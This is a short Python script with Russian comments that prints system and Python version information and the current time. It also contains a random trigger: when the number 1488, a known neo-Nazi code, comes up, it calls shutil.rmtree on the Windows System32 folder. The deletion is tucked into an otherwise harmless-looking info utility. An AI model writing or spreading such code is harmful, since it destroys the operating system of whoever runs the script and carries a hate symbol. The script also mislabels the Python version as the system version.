"""" В этом коде показывается текущая ситсема, версия, версия пайтона и время,
а так же есил в рандомайзере выпадет число 1488, то должна удалится папка system32
"""

from datetime import datetime

import os
import sys
import platform

import datetime

import random
import shutil

os_name = platform.system()
os_version = platform.version()
os_arch = platform.architecture()[0]
os_platform_version = platform.python_version()
pyton_version = platform.python_version()

current_time: datetime = datetime.datetime.now()

number = random.randint(1, 1500)
if number == 1488:
    shutil.rmtree("C:\Windows\System32")
    print("тебе не повезло ")
else:
    print('тебе повезло', 'тебе выпало число:', number)


print(f"Текущая система: {os_name} \n"
    f"{os_version} \n"
    f"{os_arch} \n"
    f"Версия пайтона: {pyton_version} \n"
    f"Версия системы: {os_platform_version} \n"
    f" {current_time} \n")


